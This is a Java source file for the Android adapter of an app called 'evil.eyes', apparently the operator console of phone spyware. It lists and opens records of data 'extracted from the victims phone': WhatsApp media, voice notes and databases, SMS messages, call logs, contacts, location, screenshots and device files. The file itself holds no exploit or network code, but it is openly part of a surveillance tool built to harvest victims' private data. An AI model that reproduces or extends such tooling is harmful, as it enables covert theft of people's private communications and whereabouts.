package evil.eyes.core.adapters;

import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.widget.AppCompatButton;
import androidx.cardview.widget.CardView;
import androidx.recyclerview.widget.RecyclerView;

import java.util.List;

import evil.eyes.R;
import evil.eyes.core.RecentModel;
import evil.eyes.core.utils.PayloadTypes;
import evil.eyes.core.utils.TimeUtils;
import evil.eyes.ui.ContactsDisplay;
import evil.eyes.ui.PhoneDisplay;
import evil.eyes.ui.SmsDisplay;

public class RecentAdapter extends RecyclerView.Adapter<RecentAdapter.ViewHolder> {

    private List<RecentModel> recentModels;
    private boolean isDetailedRecord = false;

    public RecentAdapter(List<RecentModel> recentModels, boolean isDetailedRecord) {
        this.recentModels = recentModels;
        this.isDetailedRecord = isDetailedRecord;
    }

    public RecentAdapter(List<RecentModel> recentModels) {
        this.recentModels = recentModels;
    }

    @NonNull
    @Override
    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        return new ViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.items_recents, parent, false));
    }

    @Override
    public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
        RecentModel recentModel = recentModels.get(position);

        holder.cardView.setCardBackgroundColor((position % 3) == 0 ? Color.parseColor("#5185ff") : Color.parseColor("#ff94b6"));
        if (position % 2 == 0) {
            holder.cardView.setCardBackgroundColor(Color.parseColor("#6164cf"));

        }
        holder.tittle.setText(recentModel.getName());
        holder.recordTime.setText(isDetailedRecord ? "Fetched on: " + TimeUtils.getTimeFromTimeStamp(recentModel.timeStamp) : "Fetched on : Latest (last time)");
        holder.separator.setImageDrawable(holder.itemView.getContext().getDrawable(getName(recentModel.key)));
        holder.desc.setText(getDescription(recentModel.key));
        holder.button_record.setOnClickListener(l -> {
            if (recentModel.name.equalsIgnoreCase("CALL LOGS")) {
                holder.itemView.getContext().startActivity(new Intent(holder.itemView.getContext(), PhoneDisplay.class).putExtra("uri", recentModel.link));
            } else if (recentModel.name.equalsIgnoreCase("CONTACTS LOGS")) {
                holder.itemView.getContext().startActivity(new Intent(holder.itemView.getContext(), ContactsDisplay.class).putExtra("uri", recentModel.link));
            } else if (recentModel.name.contains("SMS") || recentModel.name.contains("sms")) {
                holder.itemView.getContext().startActivity(new Intent(holder.itemView.getContext(), SmsDisplay.class).putExtra("uri", recentModel.link));
            }else if (recentModel.name.equalsIgnoreCase("BATTERY INFO") ||
                    recentModel.name.equalsIgnoreCase("Payload permission Info") ||
                    recentModel.name.equalsIgnoreCase("Device Info")) {
                //TODO JSON VIEWER
            }else {
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(recentModel.link));
                holder.itemView.getContext().startActivity(browserIntent);
            }
        });

    }

    @Override
    public int getItemCount() {
        return recentModels != null ? recentModels.size() : 0;
    }

    public class ViewHolder extends RecyclerView.ViewHolder {

        private CardView cardView;
        private TextView tittle, recordTime, desc;
        private ImageView separator;
        private AppCompatButton button_record;

        public ViewHolder(@NonNull View itemView) {
            super(itemView);

            tittle = itemView.findViewById(R.id.tittle);
            cardView = itemView.findViewById(R.id.card_main);
            recordTime = itemView.findViewById(R.id.recordTime);
            separator = itemView.findViewById(R.id.jk);
            desc = itemView.findViewById(R.id.desc);
            button_record = itemView.findViewById(R.id.button_record);

        }
    }

    private int getName(String key) {
        int name;
        switch (key) {
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_STATUS:
                name = R.drawable.signal_status;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_GIFS:
                name = R.drawable.gif;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_AUDIO:
                name = R.drawable.volume;
                ;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_DOCUMENTS:
                name = R.drawable.documents;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_IMAGES:
                name = R.drawable.gallery;
                ;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_PROFILE_PICS:
                name = R.drawable.user;
                ;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_STICKERS:
                name = R.drawable.sticker;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_VIDEOS:
                name = R.drawable.video_chat;
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_VOICE_NOTES:
                name = R.drawable.mic;
                break;
            case "deviceInfo":
                name = R.drawable.info_dev;
                break;
            case "BATTERY":
                name = R.drawable.battery;
                break;
            case "permission":
                name = R.drawable.user_permission;
                break;
            case "calls":
                name = R.drawable.outgoing_call;
                break;
            case "contacts":
                name = R.drawable.phone_book;
                break;
            case "location":
                name = R.drawable.location;
                break;
            case "sms_inbox":
                name = R.drawable.download;
                break;

            case "sms_outbox":
                name = R.drawable.chat;
                break;

            case "sms_draft":
                name = R.drawable.draft;
                break;

            case "screenshots":
                name = R.drawable.screenshot;
                break;

            case "wbDb":
                name = R.drawable.whatsapp;
                break;

            case "phone_media_" + PayloadTypes.GET_DEVICE_FOLDER:
                name = R.drawable.folder;
                break;

            default:
                name = R.drawable.info_dev;
                break;
        }
        return name;
    }

    private String getDescription(String key) {
        String name = "";
        switch (key) {
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_STATUS:
                name = "This file contains the last extracted Whatsapp status files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_GIFS:
                name = "This file contains the last extracted Whatsapp Gifs files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_AUDIO:
                name = "This file contains the last extracted Whatsapp audio files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_DOCUMENTS:
                name = "This file contains the last extracted Whatsapp documents files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_IMAGES:
                name = "This file contains the last extracted Whatsapp images files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_PROFILE_PICS:
                name = "This file contains the last extracted saved Whatsapp profile pics from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_STICKERS:
                name = "This file contains the last extracted Whatsapp stickers files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_VIDEOS:
                name = "This file contains the last extracted Whatsapp video files from the victims phone. this is a zip file and will be downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "whatsapp_media_" + PayloadTypes.GET_WHATSAPP_VOICE_NOTES:
                name = "This file contains the last extracted Whatsapp voice notes files from the victims phone. this is a zip file and will be downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "deviceInfo":
                name = "This file contains the last extracted Device Information from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "BATTERY":
                name = "This file contains the last extracted Battery Information from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "permission":
                name = "This file contains the last extracted Payload permission Information from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "calls":
                name = "This file contains the last extracted Device call logs from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "contacts":
                name = "This file contains the last extracted Device contacts from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "location":
                name = "This file contains the last extracted Device location from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;
            case "sms_inbox":
                name = "This file contains the last extracted Device sms inbox from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;

            case "sms_outbox":
                name = "This file contains the last extracted Device sms outbox from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;

            case "sms_draft":
                name = "This file contains the last extracted Device sms draft from the victims phone. this is a json file and will be displayed as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;

            case "screenshots":
                name = "This file contains the last extracted Screenshots files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;

            case "wbDb":
                name = "This file contains the last extracted Whatsapp databases files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";
                break;

            case "phone_media_" + PayloadTypes.GET_DEVICE_FOLDER:
                name = "This file contains the last extracted files from the victims phone. this is a zip file and will bw downloaded as Show record will be clicked.Click the icon on the top right corner to show all history of this payload type.";

                break;

            default:
                name = "ERROR";
                break;
        }
        return name;
    }


}
